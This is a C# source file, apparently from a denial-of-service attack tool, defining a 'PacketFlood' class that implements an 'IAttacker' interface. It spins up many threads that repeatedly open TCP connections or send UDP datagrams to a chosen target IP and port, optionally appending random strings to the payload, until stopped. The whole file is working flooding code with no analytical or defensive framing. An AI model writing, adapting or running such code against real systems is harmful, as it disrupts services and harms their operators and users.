using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using GAS.Core.Strings;
namespace GAS.Core
{
    public class PacketFlood:IAttacker
    {
        //public int Port,Protocol,Delay,FloodCount;
        int FloodCount;
        public bool Resp, AllowRandom, init = false;
        public string Data;//,IP;
        private int Protocol;
        private Thread[] WorkingThreads;
        public PacketFlood(string ip, int port, int proto, int delay, bool resp, string data, bool random,int threadcount)
        {
            this.ThreadCount = threadcount;
            WorkingThreads = new Thread[ThreadCount];
            this.Target = ip;
            this.Port = port;
            this.Protocol = proto;
            this.Delay = delay;
            this.Resp = resp;
            this.Data = data;
            this.AllowRandom = random;
        }
        public override void Start()
        {
            IsFlooding = true;
            for (int i = 0; i < ThreadCount; (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i++)) ;
            init = true;
        }
        private void bw_DoWork(object sender)
		{
            while (!init) Thread.Sleep(100);
			try
			{
				byte[] buf= System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(Target), Port);
				while (IsFlooding)
				{
					Socket socket = null;
					switch (Protocol)
					{
						case 1:
							socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp){NoDelay = true};
							try { socket.Connect(RHost); }
							catch { continue; }
							socket.Blocking = Resp;
                            try
                            {
                                while (IsFlooding)
                                {
                                    FloodCount++;
                                    if (AllowRandom) buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
                                    socket.Send(buf);
                                    if (Delay > 0) System.Threading.Thread.Sleep(Delay);
                                }
                            }
                            catch { Failed++; }
							break;
						case 2:
                            socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp) { Blocking = Resp };
							try
							{
								while (IsFlooding)
								{
									FloodCount++;
                                    if (AllowRandom) buf=System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
									socket.SendTo(buf, SocketFlags.None, RHost);
									if (Delay > 0) System.Threading.Thread.Sleep(Delay);
								}
							}
							catch {Failed++;}
							break;
					}
				}
			}
			catch { }
		}
        public override void Stop()
        {
            IsFlooding = false;
            foreach (var x in WorkingThreads)
                try { x.Abort(); }
                catch { }
        }
    }
}